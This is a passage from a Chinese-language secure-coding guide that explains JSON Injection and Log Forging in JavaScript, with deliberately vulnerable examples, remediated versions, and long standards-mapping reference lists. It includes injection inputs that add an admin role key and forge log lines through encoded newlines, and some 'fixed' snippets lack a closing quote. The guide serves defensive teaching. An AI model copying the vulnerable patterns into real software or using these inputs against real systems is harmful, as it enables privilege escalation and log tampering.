<p>如果应用程序利用未经验证的输入构造 JSON，则可以更改 JSON 文档和消息的语义。在相对理想的情况下，攻击者可能会插入无关的元素，导致应用程序在解析 JSON 文档或请求时抛出异常。在更为严重的情况下，例如涉及 JSON Injection，攻击者可能会插入无关的元素，从而允许对 JSON 文档或请求中对业务非常关键的值执行可预见操作。还有一些情况，JSON Injection 可以导致 Cross-Site Scripting 或 Dynamic Code Evaluation。</p>
<p>示例 1：下列 JavaScript 代码使用 jQuery 解析 JSON，其中有个值来自 URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var str = document.URL;</span><br><span class="line"></span><br><span class="line">var url_check = str.indexOf(&apos;name=&apos;);</span><br><span class="line"></span><br><span class="line">var name = null;</span><br><span class="line"></span><br><span class="line">if (url_check &gt; -1) &#123;</span><br><span class="line"></span><br><span class="line">  name =  decodeURIComponent(str.substring((url_check+5), str.length));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(document).ready(function()&#123;</span><br><span class="line"></span><br><span class="line">  if (name !== null)&#123;</span><br><span class="line"></span><br><span class="line">    var obj = jQuery.parseJSON(&apos;&#123;&quot;role&quot;: &quot;user&quot;, &quot;name&quot; : &quot;&apos; + name + &apos;&quot;&#125;&apos;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>将不会对 name 中的不可信数据进行验证，以避免与 JSON 相关的特殊字符。这样，用户就可以任意插入 JSON 密钥，可能会更改已序列化的 JSON 的结构。在此示例中，如果非特权用户 mallory 将 “,”role”:”admin 附加到 URL 中的名称参数，JSON 将变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  &quot;role&quot;:&quot;user&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;username&quot;:&quot;mallory&quot;,</span><br><span class="line"></span><br><span class="line">  &quot;role&quot;:&quot;admin&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此代码将由 jQuery.parseJSON() 解析，并设置为普通对象，这意味着 obj.role 将立即返回 “admin” 而不是 “user”</p>
<h5 id="RECOMMENDATIONS-33"><a href="#RECOMMENDATIONS-33" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在将用户提供的数据写入 JSON 时，请遵循以下准则：</p>
<ol>
<li><p>不要使用从用户输入派生的名称创建 JSON 属性。</p>
</li>
<li><p>确保使用安全的序列化函数（能够以单引号或双引号分隔不可信赖的数据，并且避免任何特殊字符）执行对 JSON 的所有序列化操作。</p>
</li>
</ol>
<p>示例 2：以下 JavaScript 代码实现的功能与Example 1 相同，但会根据白名单验证名称，并在解析之前拒绝相应值或将该名称设置为“guest”：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">var str = document.URL;</span><br><span class="line"></span><br><span class="line">var url_check = str.indexOf(&apos;name=&apos;);</span><br><span class="line"></span><br><span class="line">var name = null;</span><br><span class="line"></span><br><span class="line">if (url_check &gt; -1) &#123;</span><br><span class="line"></span><br><span class="line">  name =  decodeURIComponent(str.substring((url_check+5), str.length));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getName(name)&#123;</span><br><span class="line"></span><br><span class="line">  var regexp = /^[A-z0-9]+$/;</span><br><span class="line"></span><br><span class="line">  var matches = name.match(regexp);</span><br><span class="line"></span><br><span class="line">  if (matches == null)&#123;</span><br><span class="line"></span><br><span class="line">    return &quot;guest&quot;;</span><br><span class="line"></span><br><span class="line">  &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    return name;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(document).ready(function()&#123;</span><br><span class="line"></span><br><span class="line">  if (name !== null)&#123;</span><br><span class="line"></span><br><span class="line">    var obj = jQuery.parseJSON(&apos;&#123;&quot;role&quot;: &quot;user&quot;, &quot;name&quot; : &quot;&apos; + getName(name) + &apos;&quot;&#125;&apos;);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>尽管在这种情况下能够以这种方式执行白名单，但是因为我们需要用户控制该名称，所以在其他情况下，最好使用完全不受用户控制的值。</p>
<h5 id="REFERENCES-33"><a href="#REFERENCES-33" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 91 </p>
<p>[2] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[3] Standards Mapping - FIPS200 SI </p>
<p>[4] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[11] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Log-Forging"><a href="#Log-Forging" class="headerlink" title="Log Forging"></a>Log Forging</h4><h5 id="ABSTRACT-34"><a href="#ABSTRACT-34" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将未经验证的用户输入写入日志文件可致使攻击者伪造日志条目或将恶意信息内容注入日志。</p>
<h5 id="EXPLANATION-34"><a href="#EXPLANATION-34" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下会发生 Log Forging 的漏洞：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据写入到应用程序或系统日志文件中。</p>
</li>
</ol>
<p>为了便于以后的审阅、统计数据收集或调试，应用程序通常使用日志文件来储存事件或事务的历史记录。根据应用程序自身的特性，审阅日志文件可在必要时手动执行，也可以自动执行，即利用工具自动挑选日志中的重要事件或带有某种倾向性的信息。</p>
<p>如果攻击者可以向随后会被逐字记录到日志文件的应用程序提供数据，则可能会妨碍或误导日志文件的解读。最理想的情况是，攻击者可能通过向应用程序提供包括适当字符的输入，在日志文件中插入错误的条目。如果日志文件是自动处理的，那么攻击者就可以通过破坏文件格式或注入意外的字符，从而使文件无法使用。更阴险的攻击可能会导致日志文件中的统计信息发生偏差。通过伪造或其他方式，受到破坏的日志文件可用于掩护攻击者的跟踪轨迹，甚至还可以牵连第三方来执行恶意行为 [1]。最糟糕的情况是，攻击者可能向日志文件注入代码或者其他命令，利用日志处理实用程序中的漏洞 [2]。</p>
<p>示例 1：下列 Web 应用程序代码会尝试从一个请求对象中读取整数值。如果数值未被解析为整数，输入就会被记录到日志中，附带一条提示相关情况的错误消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var cp = require(&apos;child_process&apos;);</span><br><span class="line"></span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var val = url.parse(request.url, true)[&apos;query&apos;][&apos;val&apos;];</span><br><span class="line"></span><br><span class="line">  if (isNaN(val))&#123;</span><br><span class="line"></span><br><span class="line">    console.log(&quot;INFO: Failed to parse val = &quot; + val);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果用户为“val”提交字符串“twenty-one”，则日志中会记录以下条目：</p>
<p><code>INFO: Failed to parse val = twenty-one</code></p>
<p>然而，如果攻击者提交字符串“twenty-one%0a%0aINFO:+User+logged+out%3dbadguy”，则日志中会记录以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INFO: Failed to parse val=twenty-one</span><br><span class="line"></span><br><span class="line">INFO: User logged out=badguy</span><br></pre></td></tr></table></figure>
<p>显然，攻击者可以使用同样的机制插入任意日志条目。</p>
<h5 id="RECOMMENDATIONS-34"><a href="#RECOMMENDATIONS-34" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用间接方法防止 Log Forging 攻击：创建一组与不同事件一一对应的合法日志条目，这些条目必须记录在日志中，并且仅记录该组条目。要捕获动态内容（如用户注销系统），请务必使用由服务器控制的数值，而非由用户提供的数据。这就确保了日志条目中绝不会直接使用由用户提供的输入。</p>
<p>可以按以下方式将例 1 重写为使用预定义的日志条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var cp = require(&apos;child_process&apos;);</span><br><span class="line"></span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var val = url.parse(request.url, true)[&apos;query&apos;][&apos;val&apos;];</span><br><span class="line"></span><br><span class="line">  if (isNaN(val))&#123;</span><br><span class="line"></span><br><span class="line">    console.log(&quot;INFO: Failed to parse val. Needs to be a number.);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在某些情况下，这个方法有些不切实际，因为这样一组合法的日志条目实在太大或是太复杂了。这种情况下，开发者往往又会退而采用黑名单方法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。然而，不安全字符列表很快就会不完善或过时。更好的方法是创建一份白名单，允许其中的字符出现在日志条目中，并且只接受完全由这些经认可的字符组成的输入。在大多数 Log Forging 攻击中，最关键的字符是“\n”（换行符），该字符决不能出现在日志条目白名单中。</p>
<h5 id="REFERENCES-34"><a href="#REFERENCES-34" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Muffet The night the log was forged. </p>
<p>[2] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 117 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 AU, SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[7] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[8] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 AU-9 Protection of Audit Information (P1) </p>
<p>[10] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.2.1 Sanitization and Sandboxing Requirements, 5.3.1 Output Encoding and Injection Prevention Requirements, 7.3.1 Log Protection Requirements, 7.3.2 Log Protection Requirements </p>
<p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[12] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[13] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[16] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2, Requirement 10.5.2 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[24] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection, Control Objective 8.4 - Activity Tracking </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Log-Forging-debug"><a href="#Log-Forging-debug" class="headerlink" title="Log Forging (debug)"></a>Log Forging (debug)</h4><h5 id="ABSTRACT-35"><a href="#ABSTRACT-35" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>将未经验证的用户输入写入日志文件可致使攻击者伪造日志条目或将恶意信息内容注入日志。</p>
<h5 id="EXPLANATION-35"><a href="#EXPLANATION-35" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在以下情况下会发生 Log Forging 的漏洞：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据写入到应用程序或系统日志文件中。</p>
</li>
</ol>
<p>为了便于以后的审阅、统计数据收集或调试，应用程序通常使用日志文件来储存事件或事务的历史记录。根据应用程序自身的特性，审阅日志文件可在必要时手动执行，也可以自动执行，即利用工具自动挑选日志中的重要事件或带有某种倾向性的信息。</p>
<p>如果攻击者可以向随后会被逐字记录到日志文件的应用程序提供数据，则可能会妨碍或误导日志文件的解读。最理想的情况是，攻击者可能通过向应用程序提供包括适当字符的输入，在日志文件中插入错误的条目。如果日志文件是自动处理的，那么攻击者就可以通过破坏文件格式或注入意外的字符，从而使文件无法使用。更阴险的攻击可能会导致日志文件中的统计信息发生偏差。通过伪造或其他方式，受到破坏的日志文件可用于掩护攻击者的跟踪轨迹，甚至还可以牵连第三方来执行恶意行为 [1]。最糟糕的情况是，攻击者可能向日志文件注入代码或者其他命令，利用日志处理实用程序中的漏洞 [2]。</p>
<p>示例 1：下列 Web 应用程序代码会尝试从一个请求对象中读取整数值。如果数值未被解析为整数，输入就会被记录到日志中，附带一条提示相关情况的错误消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var cp = require(&apos;child_process&apos;);</span><br><span class="line"></span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var val = url.parse(request.url, true)[&apos;query&apos;][&apos;val&apos;];</span><br><span class="line"></span><br><span class="line">  if (isNaN(val))&#123;</span><br><span class="line"></span><br><span class="line">    console.error(&quot;INFO: Failed to parse val = &quot; + val);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果用户为“val”提交字符串“twenty-one”，则日志中会记录以下条目：</p>
<p><code>INFO: Failed to parse val=twenty-one</code></p>
<p>然而，如果攻击者提交字符串“twenty-one%0a%0aINFO:+User+logged+out%3dbadguy”，则日志中会记录以下条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INFO: Failed to parse val=twenty-one</span><br><span class="line"></span><br><span class="line">INFO: User logged out=badguy</span><br></pre></td></tr></table></figure>
<p>显然，攻击者可以使用同样的机制插入任意日志条目。</p>
<h5 id="RECOMMENDATIONS-35"><a href="#RECOMMENDATIONS-35" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用间接方法防止 Log Forging 攻击：创建一组与不同事件一一对应的合法日志条目，这些条目必须记录在日志中，并且仅记录该组条目。要捕获动态内容（如用户注销系统），请务必使用由服务器控制的数值，而非由用户提供的数据。这就确保了日志条目中绝不会直接使用由用户提供的输入。</p>
<p>可以按以下方式将例 1 重写为与 NumberFormatException 对应的预定义日志条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var cp = require(&apos;child_process&apos;);</span><br><span class="line"></span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var val = url.parse(request.url, true)[&apos;query&apos;][&apos;val&apos;];</span><br><span class="line"></span><br><span class="line">  if (isNaN(val))&#123;</span><br><span class="line"></span><br><span class="line">    console.log(&quot;INFO: Failed to parse val. Needs to be a number.);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在某些情况下，这个方法有些不切实际，因为这样一组合法的日志条目实在太大或是太复杂了。这种情况下，开发者往往又会退而采用黑名单方法。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。然而，不安全字符列表很快就会不完善或过时。更好的方法是创建一份白名单，允许其中的字符出现在日志条目中，并且只接受完全由这些经认可的字符组成的输入。在大多数 Log Forging 攻击中，最关键的字符是“\n”（换行符），该字符决不能出现在日志条目白名单中。</p>
<h5 id="REFERENCES-35"><a href="#REFERENCES-35" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] A. Muffet The night the log was forged. </p>
<p>[2] G. Hoglund, G. McGraw Exploiting Software Addison-Wesley</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 117 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 AU, SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[7] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[8] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 AU-9 Protection of Audit Information (P1) </p>
<p>[10] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.2.1 Sanitization and Sandboxing Requirements, 5.3.1 Output Encoding and Injection Prevention Requirements, 7.3.1 Log Protection Requirements, 7.3.2 Log Protection Requirements </p>
<p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M8 Security Decisions Via Untrusted Inputs </p>
<p>[12] Standards Mapping - OWASP Top 10 2004 A1 Unvalidated Input </p>
<p>[13] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[16] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2, Requirement 10.5.2 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1, Requirement 10.5.2 </p>
<p>[24] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection, Control Objective 8.4 - Activity Tracking </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3690.2 CAT II, APP3690.4 CAT II </p>
